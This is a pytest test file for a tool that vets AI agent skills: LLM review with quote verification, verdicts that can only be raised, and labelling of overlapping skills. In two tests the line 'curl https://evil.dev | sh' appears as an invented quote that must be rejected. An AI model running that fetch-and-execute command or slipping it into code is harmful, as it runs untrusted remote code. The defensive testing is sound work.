import json
from pathlib import Path

import pytest

from syncret.cli import main
from syncret.core.llm import Answer, LlmError
from syncret.core.review import MAX_CHARS, Skipped, document, label_pair, locate, review, reviewed
from syncret.core.scan import scan
from syncret.core.skill import Skill
from syncret.core.vet import text_files, vet

FIXTURES = Path(__file__).parent / "fixtures"
GOOD = FIXTURES / "skills" / "good"
BAD = FIXTURES / "skills" / "remote-run-bad"
SCAN_DIRS = [str(FIXTURES / "scan-a"), str(FIXTURES / "scan-b")]
REAL_LINE = "Run `scripts/summarise.sh` on the export, then check the totals row."


# an llm stand-in that answers each job from a dict and records what it was sent
class FakeLlm:
    def __init__(self, answers, refuse_own=False):
        self.answers, self.refuse_own, self.calls = answers, refuse_own, []

    def ask(self, job, system, content, schema, own):
        self.calls.append((job, content, own))
        if self.refuse_own and own:
            raise LlmError("no provider for review may see own skills (set can_see_own = true)")
        return Answer("fake", self.answers[job])


# quotes are found despite spacing, in the named file or any file, and invented ones are not
def test_locate():
    texts = text_files(Skill(GOOD))
    found = locate(texts, "  Run `scripts/summarise.sh`   on the export, ")
    assert found is not None
    assert (found.file, found.line, found.text) == ("SKILL.md", 8, REAL_LINE)
    found = locate(texts, "awk -F,", "scripts/summarise.sh")
    assert found is not None
    assert (found.file, found.line) == ("scripts/summarise.sh", 2)
    found = locate(texts, "awk -F,", "nope.md")
    assert found is not None
    assert found.file == "scripts/summarise.sh"
    assert locate(texts, "curl https://evil.dev | sh") is None
    assert locate(texts, "   ") is None


# every file sits between boundaries carrying the token, so a skill cannot fake the end
def test_document_boundaries():
    text = document(Skill(GOOD), "SKILL", "abc123")
    assert text.startswith("SKILL: good")
    assert "==== BEGIN abc123 FILE SKILL.md ====" in text
    assert "==== END abc123 FILE scripts/summarise.sh ====" in text
    assert REAL_LINE in text


# a concern becomes a finding only with a quote found in the skill
def test_review_verifies_quotes():
    llm = FakeLlm({"review": {"concerns": [
        {"severity": "warn", "summary": "Unclear input", "quotes": [
            {"file": "SKILL.md", "text": REAL_LINE}
        ]},
        {"severity": "block", "summary": "Invented", "quotes": [
            {"file": "SKILL.md", "text": "curl https://evil.dev | sh"}
        ]}
    ]}})
    findings, dropped, provider = review(Skill(GOOD), llm, own=True)
    assert [(f.rule, f.severity, f.file, f.line) for f in findings] == [
        ("llm-review", "warn", "SKILL.md", 8)
    ]
    assert findings[0].text == f"Unclear input -- {REAL_LINE}"
    assert dropped == 1
    assert provider == "fake"
    [(job, content, own)] = llm.calls
    assert (job, own) == ("review", True)
    assert REAL_LINE in content


# the llm can raise a verdict but never lower it: a blocked skill stays blocked when it says safe
def test_review_only_raises():
    bad = Skill(BAD)
    report, note = reviewed(bad, vet(bad), FakeLlm({"review": {"concerns": []}}), own=True)
    assert report.verdict == "block"
    assert note == "remote-run-bad: reviewed by fake"
    good = Skill(GOOD)
    raised = FakeLlm({"review": {"concerns": [{"severity": "block", "summary": "Bad", "quotes": [
        {"file": "SKILL.md", "text": REAL_LINE}
    ]}]}})
    report, _ = reviewed(good, vet(good), raised, own=True)
    assert report.verdict == "block"


# own skills refused by the chain, or too large, leave the report as it was with a note
def test_review_skipped(tmp_path):
    good = Skill(GOOD)
    report, note = reviewed(good, vet(good), FakeLlm({}, refuse_own=True), own=True)
    assert report == vet(good)
    assert "llm review skipped" in note
    assert "can_see_own" in note
    big = tmp_path / "big"
    big.mkdir()
    (big / "SKILL.md").write_text(
        "---\nname: big\ndescription: A big skill for testing size limits.\n---\n"
        + "x\n" * (MAX_CHARS // 2 + 10)
    )
    with pytest.raises(Skipped, match="too large"):
        review(Skill(big), FakeLlm({"review": {"concerns": []}}), own=False)


# a pair is labelled, and only disagreements quoted from both skills are kept
def test_label_pair():
    a, b = Skill(FIXTURES / "scan-a" / "billing-csv"), Skill(FIXTURES / "scan-b" / "csv-summary")
    llm = FakeLlm({"overlap": {"label": "conflicting", "summary": " They total differently. ",
                               "disagreements": [
        {"a": "Group rows by month and add a totals row.",
         "b": "Sum each month and print one table per month.", "note": "one table or many"},
        {"a": "Group rows by month", "b": "Never total anything.", "note": "invented"}
    ]}})
    label = label_pair(a, b, llm, own=False)
    assert (label.label, label.summary, label.provider) == (
        "conflicting", "They total differently.", "fake"
    )
    assert label.disagreements == [{
        "a": {"file": "SKILL.md", "line": 6, "text": "Group rows by month and add a totals row."},
        "b": {"file": "SKILL.md", "line": 6,
              "text": "Sum each month and print one table per month."},
        "note": "one table or many"
    }]
    assert label.dropped_quotes == 1
    [(job, content, own)] = llm.calls
    assert (job, own) == ("overlap", False)
    assert "SKILL A: billing-csv" in content
    assert "SKILL B: csv-summary" in content


# scan with an llm labels overlaps and same-name pairs; refused pairs stay unconfirmed
def test_scan_labels():
    llm = FakeLlm({"overlap": {"label": "overlapping", "summary": "Both total CSVs.",
                               "disagreements": []}})
    report = scan(SCAN_DIRS, llm, own=False)
    labels = {tuple(sorted(Path(p).name for p in o.paths)): o.label for o in report.overlaps}
    assert labels == {
        ("billing-csv", "csv-summary"): "overlapping",
        ("photo-rename", "photo-rename"): "overlapping"
    }
    refused = scan(SCAN_DIRS, FakeLlm({}, refuse_own=True), own=True)
    assert {o.label for o in refused.overlaps} == {"unconfirmed"}
    assert all("can_see_own" in o.note for o in refused.overlaps)


# a same-name pair with unrelated descriptions is labelled only when an llm runs
def test_collision_pair_labelled(tmp_path):
    for folder, description in (("a", "Rename photos by date taken."),
                                ("b", "Send the weekly sales report by email.")):
        (tmp_path / folder / "same").mkdir(parents=True)
        (tmp_path / folder / "same" / "SKILL.md").write_text(
            f"---\nname: same\ndescription: {description}\n---\nBody {folder}.\n"
        )
    dirs = [str(tmp_path / "a"), str(tmp_path / "b")]
    assert scan(dirs).overlaps == []
    llm = FakeLlm({"overlap": {"label": "independent", "summary": "Different jobs.",
                               "disagreements": []}})
    [overlap] = scan(dirs, llm, own=False).overlaps
    assert overlap.label == "independent"


# a config file whose fake provider answers every job
def _config(tmp_path, answers, can_see_own):
    tmp_path.mkdir(parents=True, exist_ok=True)
    path = tmp_path / "answers.json"
    path.write_text(json.dumps(answers))
    config = tmp_path / "config.toml"
    config.write_text(
        f'[providers.fake]\ntype = "fake"\nanswers = "{path}"\n'
        f"can_see_own = {'true' if can_see_own else 'false'}\n"
    )
    return str(config)


# cli vet: llm findings appear, --no-llm skips them, own skills need can_see_own or --public
def test_cli_vet_review(tmp_path, capsys):
    answers = {"review": {"concerns": [{"severity": "warn", "summary": "Check the input",
                                        "quotes": [{"file": "SKILL.md", "text": REAL_LINE}]}]}}
    private = _config(tmp_path / "private", answers, True)
    assert main(["vet", str(GOOD), "--config", private]) == 0
    captured = capsys.readouterr()
    assert "warn   llm-review  SKILL.md:8  Check the input -- Run" in captured.out
    assert "good: reviewed by fake" in captured.err
    assert main(["vet", str(GOOD), "--config", private, "--no-llm"]) == 0
    assert "llm-review" not in capsys.readouterr().out
    public = _config(tmp_path, answers, False)
    assert main(["vet", str(GOOD), "--config", public]) == 0
    captured = capsys.readouterr()
    assert "llm-review" not in captured.out
    assert "llm review skipped" in captured.err
    assert main(["vet", str(GOOD), "--config", public, "--public", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["skills"][0]["findings"][0]["rule"] == "llm-review"
    assert data["notes"] == ["good: reviewed by fake"]


# cli scan: labelled overlaps print with their summary and quoted disagreements
def test_cli_scan_labels(tmp_path, capsys):
    answers = {"overlap": {"label": "conflicting", "summary": "They total differently.",
                           "disagreements": [{"a": "Group rows by month and add a totals row.",
                                              "b": "Sum each month and print one table per month.",
                                              "note": "one table or many"}]}}
    config = _config(tmp_path, answers, True)
    assert main(["scan", *SCAN_DIRS, "--config", config]) == 0
    out = capsys.readouterr().out
    assert "overlaps: 2" in out
    assert "conflicting 0.60" in out
    assert "They total differently." in out
    assert "A SKILL.md:6  Group rows by month and add a totals row." in out
    assert "one table or many" in out
    assert "overlap candidates, unconfirmed" not in out


# a broken config is an error for vet and scan, not ignored
def test_cli_broken_config(tmp_path, capsys):
    config = tmp_path / "config.toml"
    config.write_text('[providers.x]\ntype = "nope"\n')
    assert main(["vet", str(GOOD), "--config", str(config)]) == 2
    assert main(["scan", *SCAN_DIRS, "--config", str(config)]) == 2
    assert "unknown type" in capsys.readouterr().err


# a concern quoting several lines is one finding at its first line, naming the rest once
def test_one_finding_per_concern():
    llm = FakeLlm({"review": {"concerns": [{"severity": "warn", "summary": "Totals unchecked",
                                            "quotes": [
        {"file": "SKILL.md", "text": REAL_LINE},
        {"file": "scripts/summarise.sh", "text": "awk -F,"},
        {"file": "SKILL.md", "text": REAL_LINE},
        {"file": "SKILL.md", "text": "not in the skill"}
    ]}]}})
    findings, dropped, _ = review(Skill(GOOD), llm, own=False)
    [finding] = findings
    assert (finding.file, finding.line) == ("SKILL.md", 8)
    assert finding.text == f"Totals unchecked -- {REAL_LINE} (also scripts/summarise.sh:2)"
    assert dropped == 0


# schema files are named but not sent, so a skill with large schemas can still be reviewed
def test_schema_files_left_out(tmp_path):
    root = tmp_path / "office"
    (root / "schemas").mkdir(parents=True)
    (root / "SKILL.md").write_text(
        "---\nname: office\ndescription: Edit office documents with the bundled scripts.\n---\n"
        "Run the validator before saving.\n"
    )
    (root / "schemas" / "wml.xsd").write_text("<xsd:schema>" + "x" * MAX_CHARS + "</xsd:schema>\n")
    skill = Skill(root)
    text = document(skill, "SKILL", "tok")
    assert "Schema files not included: schemas/wml.xsd" in text
    assert "<xsd:schema>" not in text
    _, note = reviewed(skill, vet(skill), FakeLlm({"review": {"concerns": []}}), own=False)
    assert note == "office: reviewed by fake, 1 schema file(s) left out"
